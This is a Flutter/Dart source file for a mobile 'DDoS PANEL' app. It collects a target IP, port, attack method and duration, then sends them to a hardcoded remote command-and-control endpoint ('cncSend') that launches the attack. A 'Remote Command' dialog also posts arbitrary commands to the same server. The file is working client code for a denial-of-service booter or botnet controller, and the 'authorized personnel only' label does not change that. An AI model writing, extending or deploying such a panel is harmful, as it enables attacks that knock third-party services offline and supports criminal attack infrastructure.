import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'manage_server.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDDoS;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDDoS,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final commandController = TextEditingController();

  static const String baseUrl = "http://alfa-store-officials.alfamarket2.my.id:3771/api/vps";

  static const Color primaryColor = Color(0xFF00D4AA);
  static const Color secondaryColor = Color(0xFF090E14);
  static const Color bgColor = Color(0xFF090E14);
  static const Color surfaceColor = Color(0xFF0D0D0D);

  late AnimationController _fadeController;
  late AnimationController _glowController;
  late AnimationController _slideController;
  late Animation<double> _fadeAnimation;
  late Animation<double> _glowAnimation;
  late Animation<Offset> _slideAnimation;

  String selectedDoosId = "";
  double attackDuration = 60;
  bool isExecuting = false;
  bool isCommandExecuting = false;
  bool _isSpeedDialOpen = false;

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _setDefaultDoos();
  }

  void _initializeAnimations() {
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2000),
    )..repeat(reverse: true);

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeIn),
    );

    _glowAnimation = Tween<double>(begin: 0.3, end: 0.8).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.1),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _slideController, curve: Curves.easeOutCubic));

    _fadeController.forward();
    _slideController.forward();
  }

  void _setDefaultDoos() {
    if (widget.listDDoS.isNotEmpty) {
      selectedDoosId = widget.listDDoS[0]['ddos_id'];
    }
  }

  void _toggleSpeedDial() {
    setState(() {
      _isSpeedDialOpen = !_isSpeedDialOpen;
    });
  }

  Future<void> _sendDoos() async {
    if (isExecuting) return;
    setState(() => isExecuting = true);

    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (!_validateInputs(target, port)) {
      setState(() => isExecuting = false);
      return;
    }

    try {
      final uri = Uri.parse("$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      _handleResponse(data, target);
    } catch (_) {
      _showAlert("Error", "Connection failed.");
    } finally {
      setState(() => isExecuting = false);
    }
  }

  Future<void> _sendCommand() async {
    if (isCommandExecuting) return;
    final command = commandController.text.trim();
    if (command.isEmpty) return;

    setState(() => isCommandExecuting = true);

    try {
      final res = await http.post(
        Uri.parse("$baseUrl/sendCommand"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"key": widget.sessionKey, "command": command}),
      );
      final data = jsonDecode(res.body);

      if (data["success"] == true) {
        Navigator.pop(context);
        _showSnackBar("Command deployed successfully!");
      } else {
        _showAlert("Failed", data["error"] ?? "Execution failed.");
      }
    } catch (_) {
      _showAlert("Error", "Server unreachable.");
    } finally {
      setState(() => isCommandExecuting = false);
    }
  }

  void _showSnackBar(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg, style: const TextStyle(fontFamily: 'Rajdhani', color: Colors.white)),
        backgroundColor: secondaryColor,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10), side: BorderSide(color: primaryColor.withOpacity(0.3))),
        elevation: 10,
      ),
    );
  }

  bool _validateInputs(String target, String port) {
    if (target.isEmpty) {
      _showAlert("Warning", "Target IP is required.");
      return false;
    }
    return true;
  }

  void _handleResponse(Map<String, dynamic> data, String target) {
    if (data["success"] == true) {
      _showAlert("Success", "Packets sent to $target");
    } else {
      _showAlert("Error", data["error"] ?? "Request denied.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          width: double.infinity,
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: const Color(0xFF090E14),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: primaryColor.withOpacity(0.4), width: 1),
            boxShadow: [
              BoxShadow(color: primaryColor.withOpacity(0.08), blurRadius: 25, spreadRadius: 2),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: title == "Success" ? Colors.green.withOpacity(0.1) : Colors.red.withOpacity(0.1),
                ),
                child: Icon(
                  title == "Success" ? Icons.check_circle : Icons.error_outline,
                  color: title == "Success" ? Colors.green : Colors.red,
                  size: 40,
                ),
              ),
              const SizedBox(height: 20),
              Text(
                title.toUpperCase(),
                textAlign: TextAlign.center,
                style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold, fontFamily: 'Rajdhani', letterSpacing: 2),
              ),
              const SizedBox(height: 8),
              Text(
                msg,
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.white.withOpacity(0.55), fontSize: 12, fontFamily: 'Rajdhani', height: 1.5),
              ),
              const SizedBox(height: 22),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(vertical: 13),
                  decoration: BoxDecoration(
                    color: primaryColor,
                    borderRadius: BorderRadius.circular(12),
                    boxShadow: [BoxShadow(color: primaryColor.withOpacity(0.25), blurRadius: 10)],
                  ),
                  child: const Center(
                    child: Text("OK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontFamily: 'Rajdhani', fontSize: 15, letterSpacing: 1)),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: bgColor,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              child: Padding(
                padding: const EdgeInsets.only(left: 20, right: 20, top: 15, bottom: 100),
                child: FadeTransition(
                  opacity: _fadeAnimation,
                  child: SlideTransition(
                    position: _slideAnimation,
                    child: Column(
                      children: [
                        _buildHeader(),
                        const SizedBox(height: 30),
                        _buildTargetSection(isIcmp),
                        const SizedBox(height: 20),
                        _buildAttackSection(),
                        const SizedBox(height: 30),
                        _buildExecuteButton(),
                        const SizedBox(height: 25),
                        _buildDisclaimer(),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
          if (_isSpeedDialOpen)
            GestureDetector(
              onTap: _toggleSpeedDial,
              child: Container(color: Colors.black54),
            ),
          Positioned(bottom: 30, right: 20, child: _buildSpeedDial()),
        ],
      ),
    );
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        Container(color: bgColor),
        Positioned(
          top: -100,
          right: -100,
          child: AnimatedBuilder(
            animation: _glowController,
            builder: (context, child) {
              return Container(
                width: 300,
                height: 300,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [primaryColor.withOpacity(0.06 * _glowAnimation.value), Colors.transparent],
                    stops: const [0.0, 1.0],
                  ),
                ),
              );
            },
          ),
        ),
        Positioned(
          bottom: -50,
          left: -80,
          child: AnimatedBuilder(
            animation: _glowController,
            builder: (context, child) {
              return Container(
                width: 250,
                height: 250,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [primaryColor.withOpacity(0.04 * _glowAnimation.value), Colors.transparent],
                    stops: const [0.0, 1.0],
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _buildHeader() {
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: primaryColor.withOpacity(0.08),
            border: Border.all(color: primaryColor.withOpacity(0.15), width: 1.5),
          ),
          child: const Icon(Icons.dns_rounded, size: 36, color: primaryColor),
        ),
        const SizedBox(height: 16),
        const Text(
          "DDoS PANEL",
          style: TextStyle(
            color: Colors.white,
            fontFamily: 'Rajdhani',
            fontSize: 26,
            fontWeight: FontWeight.bold,
            letterSpacing: 4,
          ),
        ),
        const SizedBox(height: 6),
        Text(
          "Distributed Denial of Service",
          style: TextStyle(
            color: Colors.white.withOpacity(0.3),
            fontFamily: 'Rajdhani',
            fontSize: 11,
            letterSpacing: 2,
          ),
        ),
        const SizedBox(height: 12),
        Container(
          height: 1.5,
          width: 50,
          decoration: BoxDecoration(
            color: primaryColor,
            borderRadius: BorderRadius.circular(10),
            boxShadow: [BoxShadow(color: primaryColor.withOpacity(0.5), blurRadius: 8)],
          ),
        ),
      ],
    );
  }

  Widget _buildTargetSection(bool isIcmp) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: secondaryColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.04)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(color: primaryColor.withOpacity(0.1), shape: BoxShape.circle),
                child: const Icon(Icons.language_rounded, color: primaryColor, size: 14),
              ),
              const SizedBox(width: 10),
              const Text("CONNECTION", style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 2, fontFamily: 'Rajdhani')),
            ],
          ),
          const SizedBox(height: 18),
          _buildTextField(targetController, "Target Address / IP", FontAwesomeIcons.server),
          const SizedBox(height: 14),
          _buildTextField(
            portController,
            isIcmp ? "ICMP (No Port)" : "Port Number",
            FontAwesomeIcons.hashtag,
            enabled: !isIcmp,
            isNum: true,
          ),
        ],
      ),
    );
  }

  Widget _buildAttackSection() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: secondaryColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.04)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(color: primaryColor.withOpacity(0.1), shape: BoxShape.circle),
                child: const Icon(Icons.tune_rounded, color: primaryColor, size: 14),
              ),
              const SizedBox(width: 10),
              const Text("CONFIGURATION", style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 2, fontFamily: 'Rajdhani')),
            ],
          ),
          const SizedBox(height: 18),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text("DURATION", style: TextStyle(color: Colors.white.withOpacity(0.45), fontSize: 11, fontFamily: 'Rajdhani', letterSpacing: 1)),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                decoration: BoxDecoration(
                  color: primaryColor.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: primaryColor.withOpacity(0.2)),
                ),
                child: Text("${attackDuration.toInt()}s", style: const TextStyle(color: primaryColor, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'Rajdhani')),
              ),
            ],
          ),
          const SizedBox(height: 12),
          SliderTheme(
            data: SliderThemeData(
              activeTrackColor: primaryColor,
              inactiveTrackColor: Colors.white.withOpacity(0.06),
              thumbColor: primaryColor,
              thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 7),
              overlayShape: const RoundSliderOverlayShape(overlayRadius: 16),
              trackHeight: 3,
            ),
            child: Slider(
              value: attackDuration,
              min: 10, max: 300, divisions: 29,
              onChanged: (v) => setState(() => attackDuration = v),
            ),
          ),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.04),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.white.withOpacity(0.06)),
            ),
            child: DropdownButtonHideUnderline(
              child: DropdownButton<String>(
                value: selectedDoosId,
                dropdownColor: secondaryColor,
                isExpanded: true,
                icon: const Icon(Icons.arrow_drop_down, color: Colors.white38, size: 20),
                style: const TextStyle(color: Colors.white, fontFamily: 'Rajdhani', fontSize: 14),
                items: widget.listDDoS.map((e) => DropdownMenuItem(
                  value: e['ddos_id'].toString(),
                  child: Row(
                    children: [
                      Icon(Icons.bolt, color: primaryColor.withOpacity(0.6), size: 14),
                      const SizedBox(width: 10),
                      Text(e['ddos_name'].toString()),
                    ],
                  ),
                )).toList(),
                onChanged: (v) => setState(() => selectedDoosId = v!),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildExecuteButton() {
    return GestureDetector(
      onTap: isExecuting ? null : _sendDoos,
      child: AnimatedBuilder(
        animation: _glowController,
        builder: (context, child) {
          return Container(
            width: double.infinity,
            height: 58,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              gradient: LinearGradient(
                colors: [primaryColor, primaryColor.withOpacity(0.75)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              boxShadow: [
                BoxShadow(color: primaryColor.withOpacity(0.25 * _glowAnimation.value), blurRadius: 25, offset: const Offset(0, 8)),
              ],
            ),
            child: Center(
              child: isExecuting
                  ? const SizedBox(width: 22, height: 22, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2.5))
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: const [
                        Icon(Icons.play_arrow_rounded, color: Colors.white, size: 22),
                        SizedBox(width: 10),
                        Text("INITIALIZE ATTACK", style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 2.5, color: Colors.white, fontSize: 15, fontFamily: 'Rajdhani')),
                      ],
                    ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildTextField(TextEditingController ctrl, String hint, IconData icon, {bool enabled = true, bool isNum = false}) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.03),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.white.withOpacity(0.05)),
      ),
      child: TextField(
        controller: ctrl,
        enabled: enabled,
        keyboardType: isNum ? TextInputType.number : TextInputType.text,
        style: const TextStyle(color: Colors.white, fontSize: 14, fontFamily: 'Rajdhani', letterSpacing: 0.5),
        decoration: InputDecoration(
          prefixIcon: Icon(icon, color: primaryColor.withOpacity(0.5), size: 15),
          hintText: hint,
          hintStyle: TextStyle(color: Colors.white.withOpacity(0.2), fontFamily: 'Rajdhani', fontSize: 13),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 15),
        ),
      ),
    );
  }

  Widget _buildSpeedDial() {
    return Column(
      mainAxisSize: MainAxisSize.min,
      crossAxisAlignment: CrossAxisAlignment.end,
      children: [
        if (_isSpeedDialOpen) ...[
          _buildFloatingAction(FontAwesomeIcons.server, "Servers", () => Navigator.push(context, MaterialPageRoute(builder: (c) => ManageServerPage(sessionKey: widget.sessionKey)))),
          const SizedBox(height: 14),
          _buildFloatingAction(FontAwesomeIcons.terminal, "Command", _showCommandDialog),
          const SizedBox(height: 14),
        ],
        GestureDetector(
          onTap: _toggleSpeedDial,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 300),
            width: 52,
            height: 52,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: primaryColor,
              boxShadow: [BoxShadow(color: primaryColor.withOpacity(0.3), blurRadius: 15)],
            ),
            child: Icon(_isSpeedDialOpen ? Icons.close_rounded : Icons.menu_rounded, color: Colors.white, size: 22),
          ),
        ),
      ],
    );
  }

  Widget _buildFloatingAction(IconData icon, String label, VoidCallback tap) {
    return GestureDetector(
      onTap: () {
        _toggleSpeedDial();
        tap();
      },
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          color: secondaryColor,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: Colors.white.withOpacity(0.06)),
          boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 10)],
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: primaryColor, size: 14),
            const SizedBox(width: 10),
            Text(label, style: const TextStyle(color: Colors.white, fontFamily: 'Rajdhani', fontWeight: FontWeight.bold, fontSize: 13, letterSpacing: 1)),
          ],
        ),
      ),
    );
  }

  void _showCommandDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: const Color(0xFF090E14),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: primaryColor.withOpacity(0.3)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text("REMOTE COMMAND", style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold, fontFamily: 'Rajdhani', letterSpacing: 2)),
              const SizedBox(height: 16),
              Container(
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.04),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.white.withOpacity(0.06)),
                ),
                child: TextField(
                  controller: commandController,
                  style: const TextStyle(color: Colors.white, fontFamily: 'Rajdhani'),
                  decoration: InputDecoration(
                    hintText: "Enter command...",
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.2), fontFamily: 'Rajdhani'),
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
                  ),
                ),
              ),
              const SizedBox(height: 18),
              Row(
                children: [
                  Expanded(
                    child: GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(vertical: 13),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: Colors.white.withOpacity(0.08)),
                        ),
                        child: const Center(child: Text("CANCEL", style: TextStyle(color: Colors.white54, fontFamily: 'Rajdhani', fontWeight: FontWeight.bold, letterSpacing: 1))),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: GestureDetector(
                      onTap: isCommandExecuting ? null : _sendCommand,
                      child: Container(
                        padding: const EdgeInsets.symmetric(vertical: 13),
                        decoration: BoxDecoration(
                          color: primaryColor,
                          borderRadius: BorderRadius.circular(12),
                          boxShadow: [BoxShadow(color: primaryColor.withOpacity(0.25), blurRadius: 10)],
                        ),
                        child: Center(
                          child: isCommandExecuting
                              ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                              : const Text("EXECUTE", style: TextStyle(color: Colors.white, fontFamily: 'Rajdhani', fontWeight: FontWeight.bold, letterSpacing: 1)),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildDisclaimer() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        Icon(Icons.shield_outlined, color: Colors.white.withOpacity(0.15), size: 12),
        const SizedBox(width: 6),
        Text(
          "AUTHORIZED PERSONNEL ONLY",
          style: TextStyle(color: Colors.white.withOpacity(0.18), fontSize: 10, letterSpacing: 1.5, fontFamily: 'Rajdhani'),
        ),
      ],
    );
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _glowController.dispose();
    _slideController.dispose();
    targetController.dispose();
    portController.dispose();
    commandController.dispose();
    super.dispose();
  }
}